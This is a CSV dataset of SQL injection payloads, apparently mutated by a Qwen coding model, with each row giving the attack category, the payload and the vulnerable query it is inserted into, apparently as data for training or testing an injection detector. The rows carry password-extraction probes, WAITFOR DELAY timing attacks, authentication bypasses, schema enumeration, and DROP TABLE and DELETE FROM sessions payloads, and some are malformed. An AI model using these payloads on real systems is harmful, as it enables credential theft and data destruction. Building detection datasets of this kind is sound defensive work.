attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage,is_valid_syntax,winning_context_index,winning_dialect,tables,columns,literal_types,select_arm_widths,node_set,Query
blind_boolean,search,"; (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) * 0; --","SELECT * FROM products WHERE name LIKE '%; (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) * 0; --%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND (SELECT (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE id=1 LIMIT 1) > 0)--",sandbox,True,0,default,"[""users""]","[""password"", ""id""]","[""INTEGER"", ""INTEGER""]",[],"[""Ascii"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mul"", ""Select"", ""Semicolon"", ""Subquery"", ""Substring"", ""Table"", ""Where""]","; (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) * 0; --"
blind_boolean,user_lookup,") OR ASCII(SUBSTRING(username,1,1)) * 0; --","SELECT * FROM users WHERE id = ) OR ASCII(SUBSTRING(username,1,1)) * 0; --",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND 1=CAST(ASCII(SUBSTRING(username, 1, 1)) AS INT)#",sandbox,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",") OR ASCII(SUBSTRING(username,1,1)) * 0; --"
blind_boolean,order_filter,OR 1<>0 -- -,SELECT * FROM orders WHERE status = 'OR 1<>0 -- -' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' OR 1=1 SET NOCOUNT ON --,judge,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""NEQ"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",OR 1<>0 -- -
blind_boolean,comment_insert,*/; SELECT * FROM users WHERE id=1; -- -,"INSERT INTO comments (user_id, body) VALUES (1, '*/; SELECT * FROM users WHERE id=1; -- -')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,*/; DECLARE @x INT = 1; WHILE @x > 0 BEGIN WAITFOR DELAY '00:00:01'; SET @x = 0 END/*,judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",*/; SELECT * FROM users WHERE id=1; -- -
blind_boolean,comment_insert,*/; EXECUTE ('WAITFOR DELAY ''00:00:03'' AND 1=1'); -- -,"INSERT INTO comments (user_id, body) VALUES (1, '*/; EXECUTE ('WAITFOR DELAY ''00:00:03'' AND 1=1'); -- -')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,*/; DECLARE @y INT = 1; WHILE @y > 0 BEGIN WAITFOR DELAY '00:00:02'; SET @y = 0 END--,judge,False,-1,,[],[],[],[],[],*/; EXECUTE ('WAITFOR DELAY ''00:00:03'' AND 1=1'); -- -
blind_time,login,); WAITFOR DELAY '00:00:3'; --,SELECT * FROM users WHERE username = '); WAITFOR DELAY '00:00:3'; --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,""") AND (WAITFOR DELAY '00:00:3')--""",judge,False,-1,,[],[],[],[],[],); WAITFOR DELAY '00:00:3'; --
blind_time,search,%'; WAITFOR DELAY '0:0:1'; --,SELECT * FROM products WHERE name LIKE '%%'; WAITFOR DELAY '0:0:1'; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' OR (WAITFOR DELAY '0:0:1') --,judge,False,-1,,[],[],[],[],[],%'; WAITFOR DELAY '0:0:1'; --
blind_time,user_lookup,) AND (SELECT CASE WHEN (id = 1) THEN 1 ELSE 1/(SELECT id FROM users WHERE username LIKE '%admin%')) END),SELECT * FROM users WHERE id = ) AND (SELECT CASE WHEN (id = 1) THEN 1 ELSE 1/(SELECT id FROM users WHERE username LIKE '%admin%')) END),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,) AND (EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%'))),sandbox,True,5,default,"[""users""]","[""name"", ""admin""]","[""TEXT"", ""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Select"", ""Star"", ""Table"", ""Where""]",) AND (SELECT CASE WHEN (id = 1) THEN 1 ELSE 1/(SELECT id FROM users WHERE username LIKE '%admin%')) END)
blind_time,user_lookup,); WAITFOR DELAY '0:0:10'; --,SELECT * FROM users WHERE id = ); WAITFOR DELAY '0:0:10'; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,'; WAITFOR DELAY '0:0:10'--,judge,False,-1,,[],[],[],[],[],); WAITFOR DELAY '0:0:10'; --
blind_time,user_lookup,); WAITFOR DELAY '00:00:8'; --,SELECT * FROM users WHERE id = ); WAITFOR DELAY '00:00:8'; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,/* */' AND EXISTS(SELECT 1 FROM users WHERE id = 1 AND sleep(8))--,judge,False,-1,,[],[],[],[],[],); WAITFOR DELAY '00:00:8'; --
blind_time,order_filter,; WAITFOR DELAY '0:0:7' /* Exploit user session delay */,SELECT * FROM orders WHERE status = '; WAITFOR DELAY '0:0:7' /* Exploit user session delay */' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,'; WAITFOR DELAY '0:0:7 --,judge,False,-1,,[],[],[],[],[],; WAITFOR DELAY '0:0:7' /* Exploit user session delay */
blind_time,comment_insert,-- MySQL server version check DELETE FROM comments /* Exploit to delete comments */,"INSERT INTO comments (user_id, body) VALUES (1, '-- MySQL server version check DELETE FROM comments /* Exploit to delete comments */')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; WAITFOR DELAY '0:0:4' IF @@VERSION LIKE '%MySQL%'--,judge,True,0,default,[],[],[],[],[],-- MySQL server version check DELETE FROM comments /* Exploit to delete comments */
blind_time,comment_insert,) OR 1=1 /* Exploit to bypass admin authentication */,"INSERT INTO comments (user_id, body) VALUES (1, ') OR 1=1 /* Exploit to bypass admin authentication */')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,';WAITFOR DELAY '0:0:2' IF USER_ID='admin' AND USER_NAME='root'--,judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",) OR 1=1 /* Exploit to bypass admin authentication */
stacked_queries,login,); DELETE FROM sessions /* Exploit to delete all sessions */,SELECT * FROM users WHERE username = '); DELETE FROM sessions /* Exploit to delete all sessions */' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; WAITFOR DELAY '0:0:5'; --,judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",); DELETE FROM sessions /* Exploit to delete all sessions */
stacked_queries,login,; DROP TABLE temp_table --,SELECT * FROM users WHERE username = '; DROP TABLE temp_table --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"UNION ALL SELECT username, password FROM users WHERE 1=1;",sandbox,True,0,default,"[""temp_table""]",[],[],[],"[""Drop"", ""Identifier"", ""Table""]",; DROP TABLE temp_table --
stacked_queries,search,' AND 1=1; --,SELECT * FROM products WHERE name LIKE '%' AND 1=1; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' OR '1'='1'; -- temp_union
UNION SELECT 'b'
FROM (SELECT NULL AS NULL) AS temp_null
WHERE '1'='1'",judge,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]",' AND 1=1; --
stacked_queries,user_lookup,' AND 1=1; --,SELECT * FROM users WHERE id = ' AND 1=1; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND 1=1; -- temp_waitfor
WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password FROM admin_table --",judge,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]",' AND 1=1; --
stacked_queries,order_filter,') AND EXISTS(SELECT * FROM orders WHERE status != 'completed'); --,SELECT * FROM orders WHERE status = '') AND EXISTS(SELECT * FROM orders WHERE status != 'completed'); --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"') AND EXISTS(SELECT * FROM orders WHERE status = 'pending'); -- temp_delay
delay '0:0:10' DROP TABLE orders--",judge,True,6,default,"[""users"", ""orders""]","[""name"", ""status""]","[""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""Exists"", ""From"", ""Identifier"", ""Literal"", ""NEQ"", ""Paren"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]",') AND EXISTS(SELECT * FROM orders WHERE status != 'completed'); --
stacked_queries,order_filter,() OR EXISTS(SELECT * FROM orders WHERE status = 'pending'); --,SELECT * FROM orders WHERE status = '() OR EXISTS(SELECT * FROM orders WHERE status = 'pending'); --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; WAITFOR DELAY '0:0:10'; DROP TABLE users;,judge,True,0,default,"[""orders""]","[""status""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""Exists"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Tuple"", ""Where""]",() OR EXISTS(SELECT * FROM orders WHERE status = 'pending'); --
stacked_queries,comment_insert,-- DROP TABLE comments;,"INSERT INTO comments (user_id, body) VALUES (1, '-- DROP TABLE comments;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' DROP TABLE comments;--,judge,True,0,default,[],[],[],[],[],-- DROP TABLE comments;
comment_obfuscation,user_lookup,--# select */* from users where id = (select id from users where username like 'a%' limit 1);,SELECT * FROM users WHERE id = --# select */* from users where id = (select id from users where username like 'a%' limit 1);,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"/*#select*/ username AS ""u"" /*from*//*users*//*where*//*id*//=/*(SELECT id FROM users WHERE username LIKE 'a%' LIMIT 1))) --",judge,True,0,default,[],[],[],[],[],--# select */* from users where id = (select id from users where username like 'a%' limit 1);
comment_obfuscation,order_filter,#' OR lower(1)=lower(1),SELECT * FROM orders WHERE status = '#' OR lower(1)=lower(1)' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,# ' OR LOWER(1)=LOWER(1),judge,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Lower"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]",#' OR lower(1)=lower(1)
comment_obfuscation,comment_insert,) AND exists ((select * from information_schema.tables where table_schema=database() and table_name like '%comments'))),"INSERT INTO comments (user_id, body) VALUES (1, ') AND exists ((select * from information_schema.tables where table_schema=database() and table_name like '%comments')))')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,/*1*/ AND EXISTS ((SELECT * FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name LIKE '%comments'))),judge,True,6,mysql,"[""users""]","[""name"", ""comments""]","[""TEXT"", ""TEXT""]",[],"[""Alias"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]",) AND exists ((select * from information_schema.tables where table_schema=database() and table_name like '%comments')))
nested_injection,search,") OR (SUBSTRING(CAST((SELECT id FROM products WHERE id=1) AS VARCHAR), 1, 1) = '1') --","SELECT * FROM products WHERE name LIKE '%) OR (SUBSTRING(CAST((SELECT id FROM products WHERE id=1) AS VARCHAR), 1, 1) = '1') --%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; DROP TABLE products WHERE id=1;,sandbox,True,7,default,"[""users"", ""products""]","[""id""]","[""INTEGER""]",[],"[""Cast"", ""Column"", ""DataType"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Paren"", ""Select"", ""Star"", ""Subquery"", ""Substring"", ""Table"", ""Where""]",") OR (SUBSTRING(CAST((SELECT id FROM products WHERE id=1) AS VARCHAR), 1, 1) = '1') --"
nested_injection,comment_insert,); DROP TABLE comments; --,"INSERT INTO comments (user_id, body) VALUES (1, '); DROP TABLE comments; --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,) OR (1=1) --,sandbox,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",); DROP TABLE comments; --
